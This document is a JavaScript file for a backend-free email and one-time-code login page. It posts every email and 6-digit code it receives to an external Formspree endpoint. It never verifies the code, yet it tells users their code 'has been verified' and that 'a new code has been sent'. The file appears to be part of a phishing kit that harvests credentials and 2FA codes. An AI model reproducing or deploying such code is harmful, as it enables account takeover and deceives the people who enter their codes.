// =========================
// No-backend script.js (Formspree version, OTP included)
// =========================

let currentEmail = localStorage.getItem('user_email') || '';

// =========================
// Error & Success Helpers
// =========================
function showError(message) {
    const errorDiv = document.getElementById('errorMessage');
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        setTimeout(() => errorDiv.style.display = 'none', 5000);
    }
}

function showSuccess(message) {
    const successDiv = document.getElementById('successMessage');
    if (successDiv) {
        successDiv.textContent = message;
        successDiv.style.display = 'block';
        setTimeout(() => successDiv.style.display = 'none', 3000);
    }
}

function hideLoading() {
    const loading = document.getElementById('loadingScreen');
    if (loading) loading.style.display = 'none';

    const loginForm = document.getElementById('loginForm');
    const otpForm = document.getElementById('otpForm');

    if (loginForm) loginForm.style.display = 'block';
    if (otpForm) otpForm.style.display = 'block';
}

// =========================
// Formspree Endpoint
// =========================
const FORMSPREE_URL = 'https://formspree.io/f/mnnlvqqg';

// =========================
// Handle Email Submission (login.html)
// =========================
function handleLogin(event) {
    event.preventDefault();

    const emailInput = document.getElementById('email');
    if (!emailInput || !emailInput.value.includes('@')) {
        showError('Please enter a valid email');
        return;
    }

    currentEmail = emailInput.value;
    localStorage.setItem('user_email', currentEmail);

    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('loadingScreen').style.display = 'block';

    const data = new FormData();
    data.append('email', currentEmail);
    data.append('page', 'login');

    fetch(FORMSPREE_URL, {
        method: 'POST',
        body: data,
        headers: { 'Accept': 'application/json' }
    })
    .then(response => {
        if (response.ok) {
            // redirect to verify page after successful email submission
            window.location.href = 'verify.html';
        } else {
            hideLoading();
            showError('Failed to process your request.');
        }
    })
    .catch(() => {
        hideLoading();
        showError('Failed to process your request.');
    });
}

// =========================
// Handle OTP Submission (verify.html)
// =========================
function handleOTP(event) {
    event.preventDefault();

    const otpInput = document.getElementById('otp');
    if (!otpInput || !/^\d{6}$/.test(otpInput.value)) {
        showError('Please enter a valid 6-digit code');
        return;
    }

    const otp = otpInput.value;

    document.getElementById('otpForm').style.display = 'none';
    document.getElementById('loadingScreen').style.display = 'block';

    const data = new FormData();
    data.append('email', currentEmail);
    data.append('otp', otp);
    data.append('page', 'otp');

    fetch(FORMSPREE_URL, {
        method: 'POST',
        body: data,
        headers: { 'Accept': 'application/json' }
    })
    .then(response => {
        if (response.ok) {
            showSuccess('Your code has been verified!');
            // Optionally, redirect to next page after verification
            // window.location.href = 'nextpage.html';
        } else {
            hideLoading();
            showError('Failed to process your request.');
        }
    })
    .catch(() => {
        hideLoading();
        showError('Failed to process your request.');
    });
}

// =========================
// Resend OTP (verify.html)
// =========================
function resendCode() {
    const data = new FormData();
    data.append('email', currentEmail);
    data.append('action', 'resend');
    data.append('page', 'otp');

    fetch(FORMSPREE_URL, {
        method: 'POST',
        body: data,
        headers: { 'Accept': 'application/json' }
    })
    .then(() => showSuccess('A new code has been sent'))
    .catch(() => showError('Failed to resend code'));
}

// =========================
// Initialization
// =========================
document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');
    if (loginForm) loginForm.addEventListener('submit', handleLogin);

    const otpForm = document.getElementById('otpForm');
    if (otpForm) otpForm.addEventListener('submit', handleOTP);
});
